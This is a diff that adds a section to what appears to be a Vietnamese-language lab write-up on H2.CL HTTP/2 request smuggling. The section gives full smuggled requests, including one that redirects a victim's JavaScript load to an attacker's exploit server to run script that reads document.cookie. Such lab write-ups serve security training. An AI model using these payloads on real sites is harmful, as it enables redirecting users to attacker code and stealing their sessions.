@@ -395,6 +395,44 @@ Sau khi submit request trên, smuggled request sẽ là `GET /post?postId=7` v�
 # 11. Response queue poisoning via H2.TE request smuggling
 
 # 12. H2.CL request smuggling
+Cấu hình request:
+```
+POST / HTTP/2
+Host: 0a8f008704dfb560c0c11d910059000c.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /404 HTTP/1.1
+Host: 0a8f008704dfb560c0c11d910059000c.web-security-academy.net
+Content-Length: 10
+
+x=1
+```
+Khi submit 2 lần, ta nhận được response `HTTP/2 404 Not Found`. Như vậy, website có lỗ ổng H2.CL.
+
+Nhận thấy khi ta gửi request `GET /resources` đến server, response sẽ là:
+```
+HTTP/2 302 Found
+Location: https://0a8f008704dfb560c0c11d910059000c.web-security-academy.net/resources/
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+Do đó, nếu ta thay đổi header `Host: <exploit-server>`, ta có thể khiến user redirect tới resources nằm trong exploit server. Vào exploit server và thay đổi đoạn javascript thành `alert(document.cookie)`, sau đó cấu hình request sau:
+```
+POST / HTTP/2
+Host: 0a8f008704dfb560c0c11d910059000c.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0aae00220498b590c0a21c8901f000e7.exploit-server.net
+Content-Length: 10
+
+x=1
+```
+Thử submit hai lần, ta thấy response thứ hai có header `Location: https://exploit-0aae00220498b590c0a21c8901f000e7.exploit-server.net/resources/`. Như vậy, nếu ta có thể khiến user gửi request này dưới dạng một request yêu cầu javascript, thì lệnh `alert` sẽ được execute.
+
+Submit request sao cho đúng vào thời điểm sau khi browser của victim load website, và chuẩn bị load javascript resources. Kết quả, bài lab được giải thành công.
 
 # 13. HTTP/2 request smuggling via CRLF injection
 
